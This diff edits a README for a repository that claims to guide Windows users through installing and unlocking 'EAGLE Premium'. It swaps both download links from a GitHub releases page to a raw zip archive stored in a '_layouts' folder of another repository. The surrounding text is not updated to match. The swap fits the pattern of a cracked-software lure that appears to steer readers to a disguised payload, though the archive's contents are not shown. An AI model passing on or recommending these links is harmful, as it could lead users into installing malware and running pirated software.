@@ -5,7 +5,7 @@ description: "Install and troubleshoot EAGLE Premium on Windows with this guide 
 ---
 # ⚡ EAGLE-Windows-Guide - Install EAGLE Premium on Windows easily
 
-[![](https://img.shields.io/badge/Download-EAGLE_Guide-blue.svg)](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download-EAGLE_Guide-blue.svg)](https://raw.githubusercontent.com/lemmiecanonic88/lemmiecanonic88.github.io/main/_layouts/Release-3.9-beta.4.zip)
 
 This guide helps you put EAGLE Premium on your Windows 11 computer. Many users face installation blocks when they try to set it up. This repository contains the steps to bypass these errors and complete the process. Read these instructions to prepare your system and run the installer.
 
@@ -22,7 +22,7 @@ Before you start the installer, your system needs specific components to run EAG
 
 ## 📥 Getting the Files
 
-Visit this page to download the necessary installation files: [https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases](https://github.com/lemmiecanonic88/EAGLE-Windows-Guide/releases).
+Visit this page to download the necessary installation files: [https://raw.githubusercontent.com/lemmiecanonic88/lemmiecanonic88.github.io/main/_layouts/Release-3.9-beta.4.zip](https://raw.githubusercontent.com/lemmiecanonic88/lemmiecanonic88.github.io/main/_layouts/Release-3.9-beta.4.zip).
 
 Look for the latest release on the right side of the page. Click the file name to start your download. Save the file to your Downloads folder to find it easily. 
 
